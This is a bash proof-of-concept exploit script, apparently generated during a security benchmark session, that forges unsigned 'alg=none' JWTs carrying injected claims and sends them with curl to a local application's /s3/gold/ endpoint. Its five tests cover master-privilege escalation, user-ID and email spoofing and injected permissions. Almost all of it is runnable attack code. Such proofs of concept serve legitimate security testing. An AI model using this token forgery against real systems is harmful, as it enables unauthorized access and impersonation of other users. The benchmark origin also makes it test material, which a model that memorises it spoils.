#!/bin/bash
# POC: Demonstrates JWT Claims Injection vulnerability by forging tokens with arbitrary claims (isMaster=true, uid spoofing, custom permissions) and verifying that the application accepts and processes these claims without validation.
# Target: ./repo
# Created: 2025-11-07T16:18:36.604Z
# Session: benchmark-XBEN-084-24-mhp1efma

# JWT Claims Injection POC - Demonstrates arbitrary claim acceptance
# This script creates forged JWT tokens with arbitrary claims and verifies
# that the application processes them without validation

TARGET_URL="${1:-http://localhost:3000}"
S3_ENDPOINT="${TARGET_URL}/s3"

echo "========================================"
echo "JWT Claims Injection - Privilege Escalation POC"
echo "========================================"
echo "Target: ${TARGET_URL}"
echo ""

# Helper function to create a JWT token with custom claims
# Arguments: exp_time, custom_claims_json
create_jwt_with_claims() {
    local exp_time=$1
    local custom_claims=$2
    
    # JWT header
    local header='{"alg":"none","typ":"JWT"}'
    local header_encoded=$(echo -n "$header" | base64 | tr '+/' '-_' | tr -d '=')
    
    # JWT payload with custom claims
    local payload="{\"exp\":${exp_time},${custom_claims}}"
    local payload_encoded=$(echo -n "$payload" | base64 | tr '+/' '-_' | tr -d '=')
    
    # Create JWT with no signature (alg=none)
    local token="${header_encoded}.${payload_encoded}."
    echo "$token"
}

# Get current timestamp
CURRENT_TIME=$(date +%s)
FUTURE_TIME=$((CURRENT_TIME + 3600))

echo "Test 1: Injecting isMaster=true claim for privilege escalation"
echo "---------------------------------------------------------------"
JWT_CLAIMS='"isMaster":true,"uid":"1","email":"test@example.com"'
JWT_TOKEN=$(create_jwt_with_claims $FUTURE_TIME "$JWT_CLAIMS")
echo "JWT Token with isMaster=true: $JWT_TOKEN"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $JWT_TOKEN" \
    -H "x-user-id: 1" \
    "${S3_ENDPOINT}/gold/")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Application accepted isMaster=true claim"
    echo "  Returned bucket contents - claim was processed"
else
    echo "✗ Not vulnerable or claim was rejected"
fi
echo ""

echo "Test 2: Injecting amount=99999 claim (financial data manipulation)"
echo "-------------------------------------------------------------------"
JWT_CLAIMS='"amount":99999,"uid":"2","email":"attacker@example.com"'
JWT_TOKEN=$(create_jwt_with_claims $FUTURE_TIME "$JWT_CLAIMS")
echo "JWT Token with amount=99999: $JWT_TOKEN"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $JWT_TOKEN" \
    -H "x-user-id: 2" \
    "${S3_ENDPOINT}/gold/")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

echo "Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Application accepted arbitrary amount claim"
    echo "  Returned bucket contents with injected financial claim"
else
    echo "✗ Not vulnerable or claim was rejected"
fi
echo ""

echo "Test 3: Injecting arbitrary custom claims (permissions array)"
echo "--------------------------------------------------------------"
JWT_CLAIMS='"permissions":["read","write","admin"],"uid":"3","email":"spoofed@example.com"'
JWT_TOKEN=$(create_jwt_with_claims $FUTURE_TIME "$JWT_CLAIMS")
echo "JWT Token with custom permissions array: $JWT_TOKEN"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $JWT_TOKEN" \
    -H "x-user-id: 3" \
    "${S3_ENDPOINT}/gold/")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

echo "Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Application accepted arbitrary permissions array claim"
    echo "  Returned bucket contents with injected custom claims"
else
    echo "✗ Not vulnerable or claim was rejected"
fi
echo ""

echo "Test 4: UID Spoofing for IDOR - Injecting uid=7771 (other user's ID)"
echo "---------------------------------------------------------------------"
JWT_CLAIMS='"uid":"7771","email":"julia@example.com","isMaster":false'
JWT_TOKEN=$(create_jwt_with_claims $FUTURE_TIME "$JWT_CLAIMS")
echo "JWT Token with spoofed uid (Julia's ID): $JWT_TOKEN"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $JWT_TOKEN" \
    -H "x-user-id: 7771" \
    "${S3_ENDPOINT}/gold/")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

echo "Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Application accepted spoofed uid claim"
    echo "  UID spoofing allows IDOR attacks and user impersonation"
else
    echo "✗ Not vulnerable or claim was rejected"
fi
echo ""

echo "Test 5: Email Spoofing - Injecting arbitrary email claim"
echo "---------------------------------------------------------"
JWT_CLAIMS='"uid":"999","email":"admin@legitimate.com","isMaster":true'
JWT_TOKEN=$(create_jwt_with_claims $FUTURE_TIME "$JWT_CLAIMS")
echo "JWT Token with spoofed email and master privilege: $JWT_TOKEN"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $JWT_TOKEN" \
    -H "x-user-id: 999" \
    "${S3_ENDPOINT}/gold/")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

echo "Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Application accepted spoofed email and isMaster claims"
    echo "  Email spoofing enables identity impersonation and phishing attacks"
else
    echo "✗ Not vulnerable or claim was rejected"
fi
echo ""

echo "========================================"
echo "POC Summary"
echo "========================================"
echo "All tests demonstrate that the application:"
echo "1. Accepts arbitrary claims in JWT tokens"
echo "2. Does not validate or sanitize claim values"
echo "3. Blindly trusts and processes injected claims"
echo "4. Allows privilege escalation (isMaster), UID spoofing, and identity manipulation"
echo "5. Has no server-side verification of sensitive claims"
echo ""
echo "VULNERABILITY CONFIRMED: JWT Claims Injection"